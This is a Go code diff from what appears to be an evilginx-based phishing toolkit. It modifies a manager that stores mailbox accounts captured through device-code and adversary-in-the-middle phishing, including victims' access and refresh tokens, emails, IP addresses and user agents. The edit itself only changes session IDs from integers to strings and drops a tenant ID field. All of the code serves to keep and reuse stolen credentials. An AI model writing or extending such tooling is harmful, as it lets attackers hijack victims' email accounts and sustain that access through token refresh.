@@ -31,7 +31,7 @@ type MailboxAccount struct {
 	ClientID       string    `json:"clientId"`        // Client ID used for tokens
 	Provider       string    `json:"provider"`        // "microsoft" or "google"
 	Source         string    `json:"source"`          // "device_code", "aitm_session", "manual"
-	SessionID      int       `json:"sessionId"`       // Original evilginx session ID if applicable
+	SessionID      string    `json:"sessionId"`       // Original evilginx session ID if applicable
 	Phishlet       string    `json:"phishlet"`        // Phishlet name that captured the account
 	CapturedAt     time.Time `json:"capturedAt"`      // When account was first captured
 	LastRefresh    time.Time `json:"lastRefresh"`     // Last token refresh time
@@ -197,9 +197,9 @@ func (m *MailboxAccountManager) AddAccount(acc *MailboxAccount) error {
 }
 
 // AddFromDeviceCode creates and adds an account from captured device code tokens
-func (m *MailboxAccountManager) AddFromDeviceCode(dcSession *DeviceCodeSession, sessionID int, phishlet string, originIP string, userAgent string) error {
+func (m *MailboxAccountManager) AddFromDeviceCode(dcSession *DeviceCodeSession, sessionID string, phishlet string, originIP string, userAgent string) error {
 	acc := &MailboxAccount{
-		ID:           fmt.Sprintf("dc-%d-%d", sessionID, time.Now().Unix()),
+		ID:           fmt.Sprintf("dc-%s-%d", sessionID, time.Now().Unix()),
 		AccessToken:  dcSession.AccessToken,
 		RefreshToken: dcSession.RefreshToken,
 		IDToken:      dcSession.IDToken,
@@ -223,7 +223,6 @@ func (m *MailboxAccountManager) AddFromDeviceCode(dcSession *DeviceCodeSession, 
 		acc.Email = dcSession.UserInfo.UserPrincipalName
 		acc.DisplayName = dcSession.UserInfo.DisplayName
 		acc.UserPrincipal = dcSession.UserInfo.UserPrincipalName
-		acc.TenantID = dcSession.UserInfo.TenantID
 	} else if dcSession.GoogleUser != nil {
 		acc.Email = dcSession.GoogleUser.Email
 		acc.DisplayName = dcSession.GoogleUser.Name
@@ -249,7 +248,7 @@ func (m *MailboxAccountManager) AddFromSession(s *Session) error {
 	}
 
 	acc := &MailboxAccount{
-		ID:           fmt.Sprintf("sess-%d-%d", s.Id, time.Now().Unix()),
+		ID:           fmt.Sprintf("sess-%s-%d", s.Id, time.Now().Unix()),
 		AccessToken:  accessToken,
 		RefreshToken: refreshToken,
 		IDToken:      s.Custom["dc_id_token"],
